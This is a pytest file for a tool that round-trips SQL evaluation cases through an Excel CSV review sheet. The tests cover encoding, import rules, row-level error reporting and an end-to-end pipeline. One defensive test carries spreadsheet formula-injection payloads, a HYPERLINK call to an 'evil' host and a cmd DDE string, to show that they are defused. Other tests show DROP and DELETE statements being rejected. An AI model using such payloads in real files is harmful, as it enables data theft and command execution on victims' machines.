# SPDX-License-Identifier: BUSL-1.1
# Copyright (c) 2024-2026 Ali Sadeghi Aghili
"""Tests for scripts/golden_sheet.py: the Excel review round trip.

The CSV is written and re-read as real files in ``tmp_path``; "the
analyst" is simulated by editing cells with the ``csv`` module. Pins the
UTF-8-with-BOM encoding Excel needs for Persian, the formula-injection
defence, every import rule (correct / wrong / skip / blank), problem
reporting by spreadsheet row, idempotent re-imports, and the full
harvest -> sheet -> import -> verify -> offline-run chain.
"""

from __future__ import annotations

import csv
import doctest
import io
import json
from pathlib import Path

import pandas as pd
import pytest

from eval import cli
from eval.models import GoldenCase
from eval.runner import (
    load_golden_cases,
    make_offline_executor,
    make_offline_generator,
    run_golden_set,
)
from schema_data.columns import TABLE_COLUMNS
from scripts import golden_sheet as gs
from scripts import harvest_golden
from scripts.golden_sheet import COLUMNS, import_sheet, main, read_sheet, refuse_formula, render_sheet

_TABLE = next(iter(TABLE_COLUMNS))
GOOD_SQL = f"SELECT COUNT(*) AS n FROM {_TABLE}"
OTHER_SQL = f"SELECT TOP 3 * FROM {_TABLE}"
TEMPLATE = Path(__file__).resolve().parent.parent / "eval_data.example" / "golden_review_template.csv"
SECRET = "پرسش-محرمانه"


def _cand(case_id="c1", question="How many rows?", sql=GOOD_SQL, **kw):
    kw.setdefault("status", "pending_review")
    kw.setdefault("tags", ["lang:en", "source:sales", "outcome:success"])
    return GoldenCase(id=case_id, question=question, expected_sql=sql, **kw)


def _write_cases(path, cases):
    path.write_text("".join(json.dumps(c.to_dict(), ensure_ascii=False) + "\n" for c in cases),
                    encoding="utf-8")
    return path


def _edit_sheet(path, edits):
    """Simulate the analyst: ``edits`` maps case id -> {column: value}."""
    rows = list(csv.reader(io.StringIO(path.read_text(encoding="utf-8-sig"), newline="")))
    header = rows[0]
    for row in rows[1:]:
        for column, value in edits.get(row[0], {}).items():
            row[header.index(column)] = value
    out = io.StringIO()
    csv.writer(out, lineterminator="\r\n").writerows(rows)
    path.write_text("﻿" + out.getvalue(), encoding="utf-8", newline="")


class TestExport:
    def test_header_and_bom_are_what_excel_needs(self, tmp_path):
        cases = _write_cases(tmp_path / "c.jsonl", [_cand(question=f"{SECRET}؟")])
        out = tmp_path / "review.csv"
        assert main(["export", "--cases", str(cases), "--out", str(out)]) == 0
        raw = out.read_bytes()
        assert raw.startswith(b"\xef\xbb\xbf")
        assert raw[3:].decode("utf-8").splitlines()[0] == ",".join(COLUMNS)
        assert COLUMNS == ("id", "question", "proposed_sql", "correct_sql", "verdict",
                           "expect", "datasource", "notes")
        assert f"{SECRET}؟" in raw.decode("utf-8")  # real UTF-8, not escaped

    def test_correct_sql_and_verdict_start_blank(self, tmp_path):
        cases = _write_cases(tmp_path / "c.jsonl", [_cand()])
        out = tmp_path / "r.csv"
        main(["export", "--cases", str(cases), "--out", str(out)])
        row = read_sheet(out)[0]
        assert (row["correct_sql"], row["verdict"], row["proposed_sql"]) == ("", "", GOOD_SQL)

    def test_only_pending_cases_are_exported(self, tmp_path):
        cases = _write_cases(tmp_path / "c.jsonl", [
            _cand("a"), _cand("b", status="reviewed"),
            GoldenCase(id="c", question="q", status="pending_expected"),
            GoldenCase(id="d", question="q2", expected_sql="SELECT 1"),
        ])
        out = tmp_path / "r.csv"
        main(["export", "--cases", str(cases), "--out", str(out)])
        assert [r["id"] for r in read_sheet(out)] == ["a", "c"]

    def test_nothing_to_export_is_exit_one(self, tmp_path, capsys):
        cases = _write_cases(tmp_path / "c.jsonl", [GoldenCase(id="d", question="q", expected_sql="SELECT 1")])
        assert main(["export", "--cases", str(cases), "--out", str(tmp_path / "r.csv")]) == 1
        assert not (tmp_path / "r.csv").exists()

    def test_never_overwrites_an_existing_sheet_without_force(self, tmp_path, capsys):
        cases = _write_cases(tmp_path / "c.jsonl", [_cand()])
        out = tmp_path / "r.csv"
        out.write_text("analyst's unsaved work", encoding="utf-8")
        assert main(["export", "--cases", str(cases), "--out", str(out)]) == 2
        assert out.read_text(encoding="utf-8") == "analyst's unsaved work"
        assert main(["export", "--cases", str(cases), "--out", str(out), "--force"]) == 0

    def test_output_is_counts_only(self, tmp_path, capsys):
        cases = _write_cases(tmp_path / "c.jsonl", [_cand(question=SECRET)])
        main(["export", "--cases", str(cases), "--out", str(tmp_path / "r.csv")])
        printed = capsys.readouterr()
        assert SECRET not in printed.out + printed.err
        assert "1 row(s)" in printed.out

    def test_formula_looking_cells_are_defused_and_restored(self, tmp_path):
        case = _cand(question="=HYPERLINK(\"//evil/\"&A1)", notes="+cmd|' /C calc'!A0",
                     sql=GOOD_SQL)
        text = render_sheet([case])
        reader = list(csv.reader(io.StringIO(text.lstrip("﻿"), newline="")))
        assert reader[1][1].startswith("'=")  # what Excel sees: text, not a formula
        assert reader[1][7].startswith("'+")
        path = tmp_path / "s.csv"
        path.write_text(text, encoding="utf-8", newline="")
        row = read_sheet(path)[0]
        assert row["question"] == case.question and row["notes"] == case.notes

    def test_multiline_sql_commas_and_quotes_survive(self, tmp_path):
        sql = f"SELECT COUNT(*) AS n,\n       'a,b' AS \"x\"\nFROM {_TABLE}"
        path = tmp_path / "s.csv"
        path.write_text(render_sheet([_cand(sql=sql)]), encoding="utf-8", newline="")
        assert read_sheet(path)[0]["proposed_sql"] == sql


class TestReadSheet:
    def test_works_with_and_without_a_bom(self, tmp_path):
        text = render_sheet([_cand()])
        with_bom, without = tmp_path / "a.csv", tmp_path / "b.csv"
        with_bom.write_bytes(text.encode("utf-8"))
        without.write_bytes(text.lstrip("﻿").encode("utf-8"))
        assert read_sheet(with_bom) == read_sheet(without)

    def test_semicolon_delimited_sheets_from_other_locales_are_read(self, tmp_path):
        path = tmp_path / "s.csv"
        path.write_text("﻿" + ";".join(COLUMNS) + "\r\nc1;سلام;SELECT 1;;correct;success;;\r\n",
                        encoding="utf-8", newline="")
        row = read_sheet(path)[0]
        assert (row["id"], row["question"], row["verdict"]) == ("c1", "سلام", "correct")

    def test_a_non_utf8_save_is_explained(self, tmp_path):
        path = tmp_path / "s.csv"
        path.write_bytes(",".join(COLUMNS).encode("utf-8") + b"\r\nc1,\xdc\xde\xdf,SELECT 1\r\n")
        with pytest.raises(ValueError, match="CSV UTF-8"):
            read_sheet(path)

    def test_missing_columns_are_named(self, tmp_path):
        path = tmp_path / "s.csv"
        path.write_text("id,question\r\nc1,q\r\n", encoding="utf-8", newline="")
        with pytest.raises(ValueError, match="missing column.*proposed_sql"):
            read_sheet(path)

    def test_header_case_and_extra_columns_are_tolerated(self, tmp_path):
        path = tmp_path / "s.csv"
        header = ",".join(c.upper() for c in COLUMNS) + ",extra"
        path.write_text(f"{header}\r\nc1,q,SELECT 1,,correct,success,,n,whatever\r\n",
                        encoding="utf-8", newline="")
        assert read_sheet(path)[0]["verdict"] == "correct"

    def test_blank_rows_are_skipped_and_row_numbers_still_match(self, tmp_path):
        path = tmp_path / "s.csv"
        blank = "," * (len(COLUMNS) - 1)
        path.write_text(",".join(COLUMNS) + "\r\n\r\nc1,q,SELECT 1,,correct,success,,n\r\n"
                        + blank + "\r\n", encoding="utf-8", newline="")
        rows = read_sheet(path)
        assert [(r["id"], r["_row"]) for r in rows] == [("c1", "3")]

    def test_row_numbers_match_the_spreadsheet(self, tmp_path):
        path = tmp_path / "s.csv"
        path.write_text(render_sheet([_cand("a"), _cand("b"), _cand("c")]), encoding="utf-8", newline="")
        assert [r["_row"] for r in read_sheet(path)] == ["2", "3", "4"]

    def test_empty_file(self, tmp_path):
        path = tmp_path / "s.csv"
        path.write_text("", encoding="utf-8")
        with pytest.raises(ValueError, match="empty"):
            read_sheet(path)


def _row(**kw):
    base = {"_row": "2", "id": "c1", "question": "", "proposed_sql": GOOD_SQL, "correct_sql": "",
            "verdict": "correct", "expect": "success", "datasource": "", "notes": ""}
    base.update(kw)
    return base


class TestImportRules:
    def test_correct_takes_the_proposed_sql(self):
        rep = import_sheet([_row()], [_cand()], [])
        case = rep.imported[0]
        assert (case.expected_sql, case.status, case.expect) == (GOOD_SQL, "reviewed", "success")
        assert case.tags == ["lang:en", "source:sales", "outcome:success"]
        assert rep.counts["correct"] == 1 and not rep.problems

    def test_wrong_with_correct_sql_takes_that_sql(self):
        rep = import_sheet([_row(verdict="wrong", correct_sql=OTHER_SQL)], [_cand()], [])
        assert rep.imported[0].expected_sql == OTHER_SQL and rep.counts["wrong"] == 1

    def test_skip_drops_the_case(self):
        rep = import_sheet([_row(verdict="skip")], [_cand()], [])
        assert rep.imported == [] and rep.counts["skipped"] == 1 and not rep.problems

    def test_blank_verdict_means_not_reviewed_yet(self):
        rep = import_sheet([_row(verdict="")], [_cand()], [])
        assert rep.imported == [] and rep.counts["unreviewed"] == 1 and not rep.problems

    def test_verdicts_are_case_and_space_insensitive(self):
        assert import_sheet([_row(verdict=" Correct ")], [_cand()], []).imported

    def test_out_of_scope_correct_needs_no_sql(self):
        cand = GoldenCase(id="c1", question="weather?", expect="out_of_scope", status="pending_review")
        rep = import_sheet([_row(proposed_sql="", expect="out_of_scope")], [cand], [])
        assert rep.imported[0].expected_sql is None and rep.imported[0].expect == "out_of_scope"

    def test_wrong_on_an_out_of_scope_candidate_with_sql_becomes_success(self):
        cand = GoldenCase(id="c1", question="q?", expect="out_of_scope", status="pending_review")
        rep = import_sheet(
            [_row(proposed_sql="", verdict="wrong", correct_sql=GOOD_SQL, expect="out_of_scope")], [cand], []
        )
        assert (rep.imported[0].expect, rep.imported[0].expected_sql) == ("success", GOOD_SQL)

    def test_empty_expectation_is_kept(self):
        assert import_sheet([_row(expect="empty")], [_cand()], []).imported[0].expect == "empty"

    def test_question_and_tags_come_from_the_candidates_file(self):
        rep = import_sheet([_row(question="mangled by excel")], [_cand(question="Original?")], [])
        assert rep.imported[0].question == "Original?"

    def test_without_a_candidates_file_the_sheets_question_is_used(self):
        rep = import_sheet([_row(question="From the sheet?")], [], [])
        assert (rep.imported[0].question, rep.imported[0].tags) == ("From the sheet?", [])

    def test_datasource_from_the_sheet_wins_over_the_candidate(self):
        cand = _cand(datasource="sales")
        assert import_sheet([_row(datasource="inventory")], [cand], []).imported[0].datasource == "inventory"
        assert import_sheet([_row()], [cand], []).imported[0].datasource == "sales"

    def test_notes_gain_a_review_marker(self):
        rep = import_sheet([_row(notes="checked with finance")], [_cand()], [])
        assert rep.imported[0].notes.startswith("checked with finance")
        assert "reviewed via sheet" in rep.imported[0].notes

    def test_blank_rows_are_ignored(self):
        blank = {k: "" for k in COLUMNS}
        blank["_row"] = "3"
        rep = import_sheet([blank], [], [])
        assert rep.counts["blank_rows"] == 1 and not rep.problems


class TestImportProblemsByRow:
    def test_guard_rejection_is_reported_with_its_row_and_id(self):
        rows = [_row(_row="2"), _row(_row="3", id="c2", verdict="wrong", correct_sql="DROP TABLE x"),
                _row(_row="4", id="c3", proposed_sql="SELECT 1; SELECT 2")]
        cands = [_cand("c1"), _cand("c2", question="two?"), _cand("c3", question="three?")]
        rep = import_sheet(rows, cands, [])
        assert [c.id for c in rep.imported] == ["c1"]
        assert [(r, i) for r, i, _ in rep.problems] == [(3, "c2"), (4, "c3")]
        assert all("guard" in m for _, _, m in rep.problems)

    def test_every_sql_goes_through_the_guard_even_the_proposed_one(self):
        rep = import_sheet([_row(proposed_sql="DELETE FROM x")], [_cand()], [])
        assert rep.imported == [] and "guard" in rep.problems[0][2]

    @pytest.mark.parametrize(
        "kw, fragment",
        [
            (dict(verdict="maybe"), "unknown verdict"),
            (dict(verdict="wrong"), "correct_sql is empty"),
            (dict(proposed_sql=""), "proposed_sql is empty"),
            (dict(correct_sql=OTHER_SQL), "use 'wrong'"),
            (dict(expect="sometimes"), "unknown expect"),
            (dict(id=""), "id is empty"),
        ],
    )
    def test_each_kind_of_problem_has_a_message(self, kw, fragment):
        rep = import_sheet([_row(**kw)], [_cand()], [])
        assert rep.imported == [] and fragment in rep.problems[0][2]

    def test_duplicate_id_in_the_sheet(self):
        rep = import_sheet([_row(), _row(_row="3")], [_cand()], [])
        assert len(rep.imported) == 1 and rep.problems[0][0] == 3

    def test_no_question_anywhere(self):
        rep = import_sheet([_row()], [], [])
        assert "no question" in rep.problems[0][2]

    def test_the_same_question_twice_under_different_ids(self):
        rows = [_row(), _row(_row="3", id="c2")]
        cands = [_cand("c1", question="Same thing?"), _cand("c2", question="same   thing?")]
        rep = import_sheet(rows, cands, [])
        assert len(rep.imported) == 1 and "already in the golden set" in rep.problems[0][2]

    def test_an_id_already_in_golden_with_different_content_is_a_problem(self):
        existing = [GoldenCase(id="c1", question="Different?", expected_sql="SELECT 1")]
        rep = import_sheet([_row()], [_cand()], existing)
        assert rep.imported == [] and "already exists" in rep.problems[0][2]

    def test_reimporting_an_identical_case_is_recognised(self):
        first = import_sheet([_row()], [_cand()], []).imported
        again = import_sheet([_row()], [_cand()], first)
        assert again.imported == [] and again.counts["already_imported"] == 1 and not again.problems


class TestImportCli:
    def _setup(self, tmp_path, cases):
        cand = _write_cases(tmp_path / "candidates.jsonl", cases)
        sheet = tmp_path / "review.csv"
        assert main(["export", "--cases", str(cand), "--out", str(sheet)]) == 0
        return cand, sheet, tmp_path / "golden.jsonl"

    def _import(self, cand, sheet, golden, *extra):
        return main(["import", "--sheet", str(sheet), "--candidates", str(cand),
                     "--golden", str(golden), *extra])

    def test_round_trip_with_persian_and_status(self, tmp_path):
        question = "تعداد سفارش‌های ۱۴۰۲ چند بود؟"
        cand, sheet, golden = self._setup(tmp_path, [_cand("a", question=question), _cand("b", question="second?")])
        _edit_sheet(sheet, {"a": {"verdict": "correct"},
                            "b": {"verdict": "wrong", "correct_sql": OTHER_SQL}})
        assert self._import(cand, sheet, golden) == 0
        cases = {c.id: c for c in load_golden_cases(golden)}
        assert cases["a"].question == question  # ZWNJ and Persian digits intact
        assert cases["b"].expected_sql == OTHER_SQL
        assert {c.status for c in cases.values()} == {"reviewed"}

    def test_problems_exit_one_but_good_rows_are_still_imported(self, tmp_path, capsys):
        cand, sheet, golden = self._setup(tmp_path, [_cand("a"), _cand("b", question="second?")])
        _edit_sheet(sheet, {"a": {"verdict": "correct"},
                            "b": {"verdict": "wrong", "correct_sql": "DROP TABLE x"}})
        assert self._import(cand, sheet, golden) == 1
        assert [c.id for c in load_golden_cases(golden)] == ["a"]
        out = capsys.readouterr().out
        assert "row 3 (b)" in out and "guard" in out
        assert "How many rows?" not in out and "second?" not in out  # no question text

    def test_second_import_after_fixing_the_cell_adds_only_the_fixed_row(self, tmp_path):
        cand, sheet, golden = self._setup(tmp_path, [_cand("a"), _cand("b", question="second?")])
        _edit_sheet(sheet, {"a": {"verdict": "correct"}, "b": {"verdict": "wrong", "correct_sql": "DROP TABLE x"}})
        self._import(cand, sheet, golden)
        _edit_sheet(sheet, {"b": {"correct_sql": OTHER_SQL}})
        assert self._import(cand, sheet, golden) == 0
        assert sorted(c.id for c in load_golden_cases(golden)) == ["a", "b"]

    def test_golden_is_rewritten_atomically_with_a_bak(self, tmp_path):
        cand, sheet, golden = self._setup(tmp_path, [_cand("a"), _cand("b", question="second?")])
        _edit_sheet(sheet, {"a": {"verdict": "correct"}})
        self._import(cand, sheet, golden)
        first = golden.read_bytes()
        _edit_sheet(sheet, {"b": {"verdict": "correct"}})
        self._import(cand, sheet, golden)
        assert (tmp_path / "golden.jsonl.bak").read_bytes() == first
        assert not [p for p in tmp_path.iterdir() if p.name.endswith(".tmp")]

    def test_dry_run_writes_nothing(self, tmp_path):
        cand, sheet, golden = self._setup(tmp_path, [_cand("a")])
        _edit_sheet(sheet, {"a": {"verdict": "correct"}})
        assert self._import(cand, sheet, golden, "--dry-run") == 0
        assert not golden.exists()

    def test_unreadable_sheet_is_exit_two(self, tmp_path, capsys):
        sheet = tmp_path / "bad.csv"
        sheet.write_bytes(b"\xff\xfe\x00bad")
        assert main(["import", "--sheet", str(sheet), "--candidates", str(tmp_path / "c.jsonl"),
                     "--golden", str(tmp_path / "g.jsonl")]) == 2
        assert "UTF-8" in capsys.readouterr().err

    def test_the_committed_template_imports_cleanly(self, tmp_path, capsys):
        raw = TEMPLATE.read_bytes()
        assert raw.startswith(b"\xef\xbb\xbf")  # BOM, like a real export
        golden = tmp_path / "golden.jsonl"
        code = main(["import", "--sheet", str(TEMPLATE), "--candidates", str(tmp_path / "none.jsonl"),
                     "--golden", str(golden)])
        assert code == 0, capsys.readouterr().out
        cases = {c.id: c for c in load_golden_cases(golden)}
        assert sorted(cases) == ["cand_example01", "cand_example02", "cand_example03"]
        assert cases["cand_example02"].expected_sql.endswith("WHERE IsActive = 1")
        assert cases["cand_example03"].expect == "out_of_scope"
        report = capsys.readouterr().out
        assert "not reviewed yet: 1" in report and "skipped (verdict skip): 1" in report

    def test_the_template_has_the_documented_columns_and_persian(self):
        text = TEMPLATE.read_text(encoding="utf-8-sig")
        assert text.splitlines()[0] == ",".join(COLUMNS)
        assert "چند مشتری فعال داریم؟" in text


class TestEndToEnd:
    """harvest -> export -> analyst -> import -> verify --accept -> offline gate."""

    def test_the_whole_chain(self, tmp_path, monkeypatch):
        records = [
            {"timestamp": f"2026-10-0{i}T10:00:00", "request_id": f"req_{i}", "question": q,
             "generated_sql": GOOD_SQL, "error_code": None, "row_count": 1, "datasource": "sales",
             "principal_id": "someone", "llm": {"model": "openai:real"}}
            for i, q in enumerate(["how many rows?", "چند ردیف داریم؟", "total rows please"], start=1)
        ]
        log = tmp_path / "audit_log.jsonl"
        log.write_text("\n".join(json.dumps(r, ensure_ascii=False) for r in records) + "\n", encoding="utf-8")
        cand = tmp_path / "candidates.jsonl"
        assert harvest_golden.main([str(log), "--out", str(cand), "--n", "10"]) == 0

        sheet = tmp_path / "review.csv"
        assert main(["export", "--cases", str(cand), "--out", str(sheet)]) == 0
        ids = [c.id for c in load_golden_cases(cand)]
        _edit_sheet(sheet, {ids[0]: {"verdict": "correct"}, ids[1]: {"verdict": "correct"},
                            ids[2]: {"verdict": "skip"}})
        golden = tmp_path / "golden.jsonl"
        assert main(["import", "--sheet", str(sheet), "--candidates", str(cand), "--golden", str(golden)]) == 0
        assert {c.status for c in load_golden_cases(golden)} == {"reviewed"}

        monkeypatch.setattr(cli, "_build_executor", lambda: (lambda sql: pd.DataFrame({"n": [9]})))
        assert cli.main(["verify", "--golden", str(golden), "--accept"]) == 0
        cases = load_golden_cases(golden)
        assert {c.status for c in cases} == {"active"} and len(cases) == 2
        assert all(c.expected_rows == [{"n": 9}] for c in cases)

        # the offline gate now runs both cases (identical reference rows are allowed)
        results = run_golden_set(cases, make_offline_generator(cases), make_offline_executor(cases))
        assert [r.status for r in results] == ["pass", "pass"]


def test_formula_defusal_is_reversible_only_for_dangerous_prefixes():
    assert refuse_formula("'=1+1") == "=1+1"
    assert refuse_formula("'-5") == "-5"
    assert refuse_formula("'hello") == "'hello"
    assert refuse_formula("'") == "'"
    assert refuse_formula("") == ""


def test_module_doctests_pass():
    failed, attempted = doctest.testmod(gs, verbose=False)
    assert attempted > 0 and failed == 0
